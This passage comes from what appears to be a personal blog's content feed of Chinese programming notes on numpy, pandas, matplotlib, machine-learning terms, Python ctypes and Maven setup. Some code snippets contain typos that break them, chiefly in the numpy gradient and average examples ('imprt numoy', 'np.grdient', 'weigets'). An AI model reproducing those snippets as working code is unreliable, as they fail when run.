class="line">np.random.choice(b,(<span class="number">3</span>,<span class="number">2</span>),p=b/np.sum(b))</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><h3 id="统计函数"><a href="#统计函数" class="headerlink" title="统计函数"></a>统计函数</h3><p><img src="/images/Numpy/image-20200409100933278.png" alt="image-20200409100933278"></p><p><img src="/images/Numpy/image-20200409101934983.png" alt="image-20200409101934983"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a = np.arange(<span class="number">15</span>).reshape(<span class="number">3</span>, <span class="number">5</span> )</span><br><span class="line">print(a)</span><br><span class="line">np.sum(a)</span><br><span class="line">print(a)</span><br><span class="line">np.mean(a, axis=<span class="number">1</span>)</span><br><span class="line">print(a)</span><br><span class="line">np.average(a,axis=<span class="number">0</span>,weigets=[<span class="number">10</span>,<span class="number">5</span>,<span class="number">1</span>])</span><br><span class="line">print(a)</span><br><span class="line">np.std(a)</span><br><span class="line">print(a)</span><br><span class="line">np.var(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><h3 id="梯度函数"><a href="#梯度函数" class="headerlink" title="梯度函数"></a>梯度函数</h3><p><img src="/images/Numpy/image-20200409102237925.png" alt="image-20200409102237925"></p><p>梯度： 连续值之间的变化率， 即斜率</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">imprt numoy <span class="keyword">as</span> np </span><br><span class="line">a = np.random.randint(<span class="number">0</span>,<span class="number">20</span>,(<span class="number">5</span>))</span><br><span class="line">print(a)</span><br><span class="line">np.gradient(a)</span><br><span class="line">b = np.random.randint(<span class="number">0</span>,<span class="number">20</span>,(<span class="number">5</span>))</span><br><span class="line">print(b)</span><br><span class="line">c = numpy.rando.randint(<span class="number">0</span>,<span class="number">50</span>,(<span class="number">3</span>,<span class="number">5</span>))</span><br><span class="line">np.grdient(c)</span><br></pre></td></tr></table></figure><h3 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h3><p><img src="/images/Numpy/image-20200409102814685.png" alt="image-20200409102814685"></p><p><img src="/images/Numpy/image-20200409102908011.png" alt="image-20200409102908011"></p><p><img src="/images/Numpy/image-20200409102956182.png" alt="image-20200409102956182"></p><p><img src="/images/Numpy/image-20200409103128814.png" alt="image-20200409103128814"></p><p><img src="/images/Numpy/image-20200409104204447.png" alt="image-20200409104204447"></p><p>###-0-0 星乘(*)和点乘(.dot)的区别</p><p>星乘表示矩阵内各对应位置相乘，矩阵a*b下标(0,0)=矩阵a下标(0,0) x 矩阵b下标(0,0)；</p><p>点乘表示求矩阵内积，二维数组称为矩阵积（mastrix product）                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             </p><p>一个行向量乘以一个列向量称作向量的内积，又叫作点积，结果;一个数；</p><p>一个列向量乘以一个行向量称作向量的外积，外积是一种特殊的<a href="http://zh.wikipedia.org/wiki/克罗内克积" target="_blank" rel="noopener">克罗内克积</a>，结果是一个矩阵，</p><h2 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="loc-，iloc"><a href="#loc-，iloc" class="headerlink" title="loc ，iloc"></a>loc ，iloc</h4><p>loc()函数：通过行索引 “Index” 中的具体值来取行数据（<strong>如取”Index”为”A”的行</strong>）</p><p>iloc()函数：通过行号来取数据</p><p><img src="/images/Numpy/20181202180501231.png" alt="img"></p><p><img src="/images/Numpy/20181202180517553.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="number">3.</span> *<span class="comment">#创建一个Dataframe*</span></span><br><span class="line"><span class="number">4.</span> data=pd.DataFrame(np.arange(<span class="number">16</span>).reshape(<span class="number">4</span>,<span class="number">4</span>),index=list(<span class="string">'abcd'</span>),columns=list(<span class="string">'ABCD'</span>))</span><br><span class="line"><span class="number">5.</span>  </span><br><span class="line"><span class="number">6.</span> In[<span class="number">1</span>]: data</span><br><span class="line"><span class="number">7.</span> Out[<span class="number">1</span>]: </span><br><span class="line"><span class="number">8.</span> ​    A   B   C   D</span><br><span class="line"><span class="number">9.</span> a   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">10.</span> b   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">11.</span> c   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">12.</span> d  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">13.</span>  </span><br><span class="line"><span class="number">14.</span> *<span class="comment">#取索引为'a'的行*</span></span><br><span class="line"><span class="number">15.</span> In[<span class="number">2</span>]: data.loc[<span class="string">'a'</span>]</span><br><span class="line"><span class="number">16.</span> Out[<span class="number">2</span>]:</span><br><span class="line"><span class="number">17.</span> A    <span class="number">0</span></span><br><span class="line"><span class="number">18.</span> B    <span class="number">1</span></span><br><span class="line"><span class="number">19.</span> C    <span class="number">2</span></span><br><span class="line"><span class="number">20.</span> D    <span class="number">3</span></span><br><span class="line"><span class="number">21.</span>  </span><br><span class="line"><span class="number">22.</span> *<span class="comment">#取第一行数据，索引为'a'的行就是第一行，所以结果相同*</span></span><br><span class="line"><span class="number">23.</span> In[<span class="number">3</span>]: data.iloc[<span class="number">0</span>]</span><br><span class="line"><span class="number">24.</span> Out[<span class="number">3</span>]:</span><br><span class="line"><span class="number">25.</span> A    <span class="number">0</span></span><br><span class="line"><span class="number">26.</span> B    <span class="number">1</span></span><br><span class="line"><span class="number">27.</span> C    <span class="number">2</span></span><br><span class="line"><span class="number">28.</span> D    <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In[<span class="number">4</span>]:data.loc[:,[<span class="string">'A'</span>]] <span class="comment">#取'A'列所有行，多取几列格式为 data.loc[:,['A','B']]</span></span><br><span class="line">Out[<span class="number">4</span>]: </span><br><span class="line">    A</span><br><span class="line">a   <span class="number">0</span></span><br><span class="line">b   <span class="number">4</span></span><br><span class="line">c   <span class="number">8</span></span><br><span class="line">d  <span class="number">12</span></span><br><span class="line"> </span><br><span class="line">In[<span class="number">5</span>]:data.iloc[:,[<span class="number">0</span>]] <span class="comment">#取第0列所有行，多取几列格式为 data.iloc[:,[0,1]]</span></span><br><span class="line">Out[<span class="number">5</span>]: </span><br><span class="line">    A</span><br><span class="line">a   <span class="number">0</span></span><br><span class="line">b   <span class="number">4</span></span><br><span class="line">c   <span class="number">8</span></span><br><span class="line">d  <span class="number">12</span></span><br><span class="line">In[<span class="number">6</span>]:data.loc[[<span class="string">'a'</span>,<span class="string">'b'</span>],[<span class="string">'A'</span>,<span class="string">'B'</span>]] <span class="comment">#提取index为'a','b',列名为'A','B'中的数据</span></span><br><span class="line">Out[<span class="number">6</span>]: </span><br><span class="line">   A  B</span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span></span><br><span class="line"> </span><br><span class="line">In[<span class="number">7</span>]:data.iloc[[<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">1</span>]] <span class="comment">#提取第0、1行，第0、1列中的数据</span></span><br><span class="line">Out[<span class="number">7</span>]: </span><br><span class="line">   A  B</span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span></span><br><span class="line"> <span class="comment">#### groupby()</span></span><br></pre></td></tr></table></figure><h4 id="groupby"><a href="#groupby" class="headerlink" title="groupby"></a>groupby</h4><p><strong><em>groupby函数主要的作用是进行数据的分组以及分组后地组内运算！\</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>df = pd.DataFrame(&#123; <span class="string">'key1'</span> :[ <span class="string">'a'</span> , <span class="string">'a'</span> , <span class="string">'b'</span> , <span class="string">'b'</span> , <span class="string">'a'</span> ],</span><br><span class="line"><span class="meta">... </span>    <span class="string">'key2'</span> :[ <span class="string">'one'</span> , <span class="string">'two'</span> , <span class="string">'one'</span> , <span class="string">'two'</span> , <span class="string">'one'</span> ],</span><br><span class="line"><span class="meta">... </span>    <span class="string">'data1'</span> :np.random.randn( <span class="number">5</span> ),</span><br><span class="line"><span class="meta">... </span>    <span class="string">'data2'</span> :np.random.randn( <span class="number">5</span> )&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>df</span><br><span class="line">       data1     data2 key1 key2</span><br><span class="line"><span class="number">0</span> - <span class="number">0.410673</span>  <span class="number">0.519378</span>    a  one</span><br><span class="line"><span class="number">1</span> - <span class="number">2.120793</span>  <span class="number">0.199074</span>    a  two</span><br><span class="line"><span class="number">2</span>  <span class="number">0.642216</span> - <span class="number">0.143671</span>    b  one</span><br><span class="line"><span class="number">3</span>  <span class="number">0.975133</span> - <span class="number">0.592994</span>    b  two</span><br><span class="line"><span class="number">4</span> - <span class="number">1.017495</span> - <span class="number">0.530459</span>    a  one</span><br><span class="line"><span class="comment">#假设你想要按key1进行分组，并计算data1列的平均值，我们可以访问data1，并根据key1调用groupby：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>grouped = df[ <span class="string">'data1'</span> ].groupby(df[ <span class="string">'key1'</span> ])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>grouped</span><br><span class="line">&lt;pandas.core.groupby.SeriesGroupBy object at <span class="number">0x04120D70</span> &gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#变量grouped是一个GroupBy对象，它实际上还没有进行任何计算，只是含有一些有关分组键df['key1']的中间数据而已，然后我们可以调用GroupBy的mean方法来计算分组平均值：</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>grouped.mean()</span><br><span class="line">key1</span><br><span class="line">a      - <span class="number">1.182987</span></span><br><span class="line">b       <span class="number">0.808674</span></span><br><span class="line">dtype: float64</span><br><span class="line"> <span class="comment">#说明：数据（Series）根据分组键进行了聚合，产生了一个新的Series，其索引为key1列中的唯一值。之所以结果中索引的名称为key1，是因为原始DataFrame的列df['key1']就叫这个名字。</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、如果我们一次传入多个数组，就会得到不同的结果：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>means = df[ <span class="string">'data1'</span> ].groupby([df[ <span class="string">'key1'</span> ], df[ <span class="string">'key2'</span> ]]).mean()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>means</span><br><span class="line">key1  key2</span><br><span class="line">a     one    - <span class="number">0.714084</span></span><br><span class="line">       two    - <span class="number">2.120793</span></span><br><span class="line">b     one     <span class="number">0.642216</span></span><br><span class="line">       two     <span class="number">0.975133</span></span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure><h4 id="plot-bar"><a href="#plot-bar" class="headerlink" title="plot.bar()"></a>plot.bar()</h4><p>画柱状图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.plot.bar(x=<span class="string">"Name"</span>,y=<span class="string">"ListPrice"</span>,color=<span class="string">'orange'</span>,title=<span class="string">"book price list"</span>)</span><br></pre></td></tr></table></figure><h4 id="merage"><a href="#merage" class="headerlink" title="merage()"></a>merage()</h4><p>设置链接字段，默认参数how是inner内连接，并且按照相同的字段key进行合并，即等价于on=”key”。也可以显示的设置on=”key”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>df1=pd.DataFrame(&#123;<span class="string">'key'</span>:list(<span class="string">'bbaca'</span>),<span class="string">'data1'</span>:range(<span class="number">5</span>)&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>df2=pd.DataFrame(&#123;<span class="string">'key'</span>:[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'d'</span>],<span class="string">'data2'</span>:range(<span class="number">3</span>)&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>df1</span><br><span class="line">  key  data1</span><br><span class="line"><span class="number">0</span>   b      <span class="number">0</span></span><br><span class="line"><span class="number">1</span>   b      <span class="number">1</span></span><br><span class="line"><span class="number">2</span>   a      <span class="number">2</span></span><br><span class="line"><span class="number">3</span>   c      <span class="number">3</span></span><br><span class="line"><span class="number">4</span>   a      <span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>df2</span><br><span class="line">  key  data2</span><br><span class="line"><span class="number">0</span>   a      <span class="number">0</span></span><br><span class="line"><span class="number">1</span>   b      <span class="number">1</span></span><br><span class="line"><span class="number">2</span>   d      <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.merge(df1,df2)</span><br><span class="line">  key  data1  data2</span><br><span class="line"><span class="number">0</span>   b      <span class="number">0</span>      <span class="number">1</span></span><br><span class="line"><span class="number">1</span>   b      <span class="number">1</span>      <span class="number">1</span></span><br><span class="line"><span class="number">2</span>   a      <span class="number">2</span>      <span class="number">0</span></span><br><span class="line"><span class="number">3</span>   a      <span class="number">4</span>      <span class="number">0</span></span><br><span class="line">&gt;&gt;&gt;pd.merge(df1,df2,on=<span class="string">'key'</span>)  <span class="comment">#推荐的写法 </span></span><br><span class="line">  key  data1  data2</span><br><span class="line"><span class="number">0</span>   b      <span class="number">0</span>      <span class="number">1</span></span><br><span class="line"><span class="number">1</span>   b      <span class="number">1</span>      <span class="number">1</span></span><br><span class="line"><span class="number">2</span>   a      <span class="number">2</span>      <span class="number">0</span></span><br><span class="line"><span class="number">3</span>   a      <span class="number">4</span>      <span class="number">0</span></span><br></pre></td></tr></table></figure><p>pd.merge()方法设置连接方法。<br>主要包括inner（内连接）、outer（外链接）、left（左连接）、right（右连接）。<br>参数how默认值是inner内连接，上面的都是采用内连接，连接两边都有的值。<br>当采用outer外连接时，会取并集，并用NaN填充。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.merge(df1,df2,how=<span class="string">'outer'</span>)</span><br><span class="line">  key  data1  data2</span><br><span class="line"><span class="number">0</span>   b    <span class="number">0.0</span>    <span class="number">1.0</span></span><br><span class="line"><span class="number">1</span>   b    <span class="number">1.0</span>    <span class="number">1.0</span></span><br><span class="line"><span class="number">2</span>   a    <span class="number">2.0</span>    <span class="number">0.0</span></span><br><span class="line"><span class="number">3</span>   a    <span class="number">4.0</span>    <span class="number">0.0</span></span><br><span class="line"><span class="number">4</span>   c    <span class="number">3.0</span>    NaN</span><br><span class="line"><span class="number">5</span>   d    NaN    <span class="number">2.0</span></span><br></pre></td></tr></table></figure><p>外连接其实左连接和右连接的并集。左连接是左侧DataFrame取全部数据，右侧DataFrame匹配左侧DataFrame。（右连接right和左连接类似）</p><p>pd.merge()方法可以通过设置left_index或者right_index的值为True来使用索引连接，例如这里df1使用data1当连接关键字，而df2使用索引当连接关键字。</p><p>从上面可以发现两个DataFrame中都有key列，merge合并之后，pandas会自动在后面加上（_x,_y）来区分，我们也可以通过设置suffixes来设置名字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd.merge(df1,df2,left_on=<span class="string">'data1'</span>,right_index=<span class="literal">True</span>,suffixes=(<span class="string">'_df1'</span>,<span class="string">'_df2'</span>))</span><br></pre></td></tr></table></figure><h4 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h4><p>merge姐妹篇<img src="/images/Numpy/20181205152000631.png" alt="在这里插入图片描述"></p><h2 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h2><h3 id="pyplot"><a href="#pyplot" class="headerlink" title="pyplot"></a>pyplot</h3><p><img src="/images/Numpy/image-20200409105245600.png" alt="image-20200409105245600"></p><p><img src="/images/Numpy/image-20200409110120169.png" alt="image-20200409110120169"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/matplotlib</title>
      <link href="python/matplotlib/"/>
      <url>python/matplotlib/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="plt"><a href="#plt" class="headerlink" title="plt"></a>plt</h2><p>支持的图类型</p><p>plt.plot(x,y,fmt)坐标系plt.boxplot(data,notch,position)箱型图plt.bar(left,height,width,bottom)柱状图plt.barh(width,bottom,left,height)横向柱状图plt.polar(theta,r)极坐标系plt.pie(data,explode)饼图plt.psd(x,NFFT=256,pad_to,Fs)功率谱密度图plt.specgram(x,NFFT=256,pad_to,F)谱图plt.cohere(x,y,NFFT=256,Fs)X-Y相关性函数plt.scatter(x,y)散点图plt.step(x,y,where)步阶图plt.hist(x,bins,normed)直方图</p><h3 id="散点图"><a href="#散点图" class="headerlink" title="散点图"></a>散点图</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/maching_learning_pyt</title>
      <link href="python/maching_learning_pyt/"/>
      <url>python/maching_learning_pyt/</url>
      
        <content type="html"><![CDATA[<h1 id="machine-learning"><a href="#machine-learning" class="headerlink" title="machine learning"></a>machine learning</h1><a id="more"></a><h2 id="basic-knowledge"><a href="#basic-knowledge" class="headerlink" title="basic knowledge"></a>basic knowledge</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>识别 </p><p>模式识别 </p><p>机器学习</p><p>深度学习 </p><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>分类 ：将实例划分到合适的类别中</p><p>回归 ： 主要用于预测数值型数据</p><h4 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h4><h4 id="非监督学习"><a href="#非监督学习" class="headerlink" title="非监督学习"></a>非监督学习</h4><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><ul><li>模型（model）: 计算机层面的认知</li><li>学习算法（learning algorithm），从数据中产生模型的方法</li><li>数据集（data set）: 一组记录的合集</li><li>示例（instance）: 对于某个对象的描述</li><li>样本（sample）: 也叫示例</li><li>属性（attribute）: 对象的某方面表现或特征</li><li>特征（feature）: 同属性</li><li>属性值（attribute value）: 属性上的取值</li><li>属性空间（attribute space）: 属性张成的空间</li><li>样本空间/输入空间（samplespace）: 同属性空间</li><li>特征向量（feature vector）: 在属性空间里每个点对应一个坐标向量，把一个示例称作特征向量</li><li>维数（dimensionality）: 描述样本参数的个数（也就是空间是几维的）</li><li>学习（learning）/训练（training）: 从数据中学得模型</li><li>训练数据（training data）: 训练过程中用到的数据</li><li>训练样本（training sample）:训练用到的每个样本</li><li>训练集（training set）: 训练样本组成的集合</li><li>假设（hypothesis）: 学习模型对应了关于数据的某种潜在规则</li><li>真相（ground-truth）:真正存在的潜在规律</li><li>学习器（learner）: 模型的另一种叫法，把学习算法在给定数据和参数空间的实例化</li><li>预测（prediction）: 判断一个东西的属性</li><li>标记（label）: 关于示例的结果信息，比如我是一个“好人”。</li><li>样例（example）: 拥有标记的示例</li><li>标记空间/输出空间（label space）: 所有标记的集合</li><li>分类（classification）: 预测是离散值，比如把人分为好人和坏人之类的学习任务</li><li>回归（regression）: 预测值是连续值，比如你的好人程度达到了0.9，0.6之类的</li><li>二分类（binary classification）: 只涉及两个类别的分类任务</li><li>正类（positive class）: 二分类里的一个</li><li>反类（negative class）: 二分类里的另外一个</li><li>多分类（multi-class classification）: 涉及多个类别的分类</li><li>测试（testing）: 学习到模型之后对样本进行预测的过程</li><li>测试样本（testing sample）: 被预测的样本</li><li>聚类（clustering）: 把训练集中的对象分为若干组</li><li>簇（cluster）: 每一个组叫簇</li><li>监督学习（supervised learning）: 典范–分类和回归</li><li>无监督学习（unsupervised learning）: 典范–聚类</li><li>未见示例（unseen instance）: “新样本“，没训练过的样本</li><li>泛化（generalization）能力: 学得的模型适用于新样本的能力</li><li>分布（distribution）: 样本空间的全体样本服从的一种规律</li><li>独立同分布（independent and identically distributed，简称i,i,d.）:获得的每个样本都是独立地从这个分布上采样获得的。</li></ul><h3 id="常见的模型指标"><a href="#常见的模型指标" class="headerlink" title="常见的模型指标"></a>常见的模型指标</h3><p>正确率 –提取出的正确信息条数 / 提取出的信息条数</p><p>召回率 –提取出的正确信息条数 / 样本中的信息条数</p><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><p>分类问题</p><p>回归问题</p><p>聚类问题  聚类是一种无监督学习任务 </p><h3 id="学习率"><a href="#学习率" class="headerlink" title="学习率"></a>学习率</h3><h2 id="KNN-近邻算法"><a href="#KNN-近邻算法" class="headerlink" title="KNN 近邻算法"></a>KNN 近邻算法</h2><p>属于一种基本分类与回归方法， </p><p>k-近邻算法属于分类问题   近朱者赤近墨者黑</p><p>k 近邻算法实际上利用训练数据集对特征向量空间进行划分，并作为其分类的“模板”。k 值的选择、距离度量以及分类决策规则是k近邻算法的三个基本要素</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/ctypes</title>
      <link href="python/ctypes/"/>
      <url>python/ctypes/</url>
      
        <content type="html"><![CDATA[<h1 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h1><a id="more"></a><p>ctypes提供了三种方法调用动态链接库：</p><p>cdll(), windll(), oledll()</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cdll():</span><br><span class="line">其导出的函数必须使用表中的cdecl调用约定</span><br><span class="line">（参数从右往左依次入栈）</span><br><span class="line">windll():</span><br><span class="line">stdll调用约定()（win32 API的原生约定）</span><br><span class="line">参数从右往左依次入栈 ，但栈的平衡处理由函数 my_socks自己完成</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--上面两种调用方式的返回值都存储在EAX中--&gt;</span>(调用约定)</span><br><span class="line">oledll() 和 windll()类似：</span><br><span class="line">不过如果函数返回一个HRESULT错误代码,可以使用COM函数得到具体的错误信息</span><br></pre></td></tr></table></figure><h2 id="hello-world实例"><a href="#hello-world实例" class="headerlink" title="hello_world实例"></a>hello_world实例</h2><p>windows：</p><p><img src="/images/ctypes/image-20200318002427524.png" alt="image-20200318002427524"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>linux：</p><p><img src="/images/ctypes/image-20200318002515586.png" alt="image-20200318002515586"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/maven-ssm</title>
      <link href="java/maven-ssm/"/>
      <url>java/maven-ssm/</url>
      
        <content type="html"><![CDATA[<h1 id="结合maven学习spring框架的后端之旅"><a href="#结合maven学习spring框架的后端之旅" class="headerlink" title="结合maven学习spring框架的后端之旅"></a>结合maven学习spring框架的后端之旅</h1><a id="more"></a><h2 id="一些基础要点"><a href="#一些基础要点" class="headerlink" title="一些基础要点"></a>一些基础要点</h2><h3 id="maven-下载依赖问题"><a href="#maven-下载依赖问题" class="headerlink" title="maven 下载依赖问题"></a>maven 下载依赖问题</h3><p>maven</p><p>配置conf 中setting.xml文件   本地仓库   镜像</p><p>idea配置pom.xml    后刷新maven中仓库信息</p><p>setting 中找到maven 处修改maven本地目录</p><p>maven 依赖不好拉  注意依赖的版本和冲突   </p><p>人生建议，有加速器就挂加速器直接从中央仓库拉取，配置阿里云仓库会出现莫名其秒的报错+有些jar文件下载失败</p><h2 id="解决maven一些问题"><a href="#解决maven一些问题" class="headerlink" title="解决maven一些问题"></a>解决maven一些问题</h2><h3 id="解决maven中不能直接创建Servlet文件和filter文件问题"><a href="#解决maven中不能直接创建Servlet文件和filter文件问题" class="headerlink" title="解决maven中不能直接创建Servlet文件和filter文件问题"></a>解决maven中不能直接创建Servlet文件和filter文件问题</h3><p>在 Project Structure中设定src/main/java为sourceRoot</p><p>再在web项目中iml文件中添加如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sourceRoots</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">url</span>=<span class="string">"file://$MODULE_DIR$/src/main/java"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">sourceRoots</span>&gt;</span></span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;module type&#x3D;&quot;JAVA_MODULE&quot; 